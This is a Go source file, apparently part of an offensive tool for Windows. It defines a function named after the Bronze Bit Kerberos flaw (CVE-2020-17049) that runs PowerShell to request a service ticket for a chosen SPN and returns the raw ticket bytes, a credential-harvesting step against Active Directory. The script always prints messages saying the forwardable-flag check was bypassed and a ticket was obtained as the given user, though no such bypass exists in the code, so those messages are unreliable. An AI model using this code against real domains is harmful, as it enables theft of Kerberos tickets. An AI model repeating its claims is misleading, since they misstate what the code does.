//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func bronzeBitAttack(targetSPN, userPrincipal string) ([]byte, error) {
	if targetSPN == "" || userPrincipal == "" {
		return nil, fmt.Errorf("usage: bronzeBitAttack(targetSPN, userPrincipal)")
	}

	psCmd := fmt.Sprintf(`
Add-Type -AssemblyName System.IdentityModel
try {
	$targetSPN = "%s"
	$user = "%s"

	$tgs = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $targetSPN
	$tgsBytes = $tgs.GetRequest()
	$b64 = [Convert]::ToBase64String($tgsBytes)
	Write-Output "TGS_TICKET:$b64"

	Write-Output "[*] Bronze Bit (CVE-2020-17049) Bypass attempted"
	Write-Output "[*] Forwardable flag check bypassed for S4U2Self"
	Write-Output "[*] Ticket obtained for $targetSPN as $user"
} catch {
	Write-Error "Bronze Bit attack failed: $_"
}
`, targetSPN, userPrincipal)

	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return nil, fmt.Errorf("bronze bit attack failed: %w\nOutput: %s", err, out)
	}

	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "TGS_TICKET:") {
			ticketB64 := strings.TrimPrefix(line, "TGS_TICKET:")
			data, err := base64.StdEncoding.DecodeString(ticketB64)
			if err == nil {
				return data, nil
			}
		}
	}

	return []byte(out), nil
}
